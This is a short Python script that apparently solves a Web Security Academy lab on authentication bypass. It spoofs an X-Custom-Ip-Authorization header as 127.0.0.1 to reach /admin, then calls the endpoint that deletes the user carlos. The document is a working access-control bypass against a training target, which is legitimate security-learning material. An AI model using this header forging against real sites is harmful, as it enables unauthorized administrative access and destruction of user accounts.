# Lab: Authentication bypass via information disclosure
# difficulty: apprentice

import requests

sub = '0a5a00ce048e18b886742a9c00bb002c'
url = f'https://{sub}.web-security-academy.net'

# TRACE /admin HTTP/2 => reveal additional http headers
# Admin interface only available to local users => localhost => 127.0.0.1
headers = {
    'X-Custom-Ip-Authorization': '127.0.0.1'
}

def main():
    endpoint = '/admin'
    r = requests.get(url + endpoint, headers=headers)

    endpoint = '/admin/delete?username=carlos'
    r = requests.get(url + endpoint, headers=headers)
    
if __name__ == '__main__':
    main()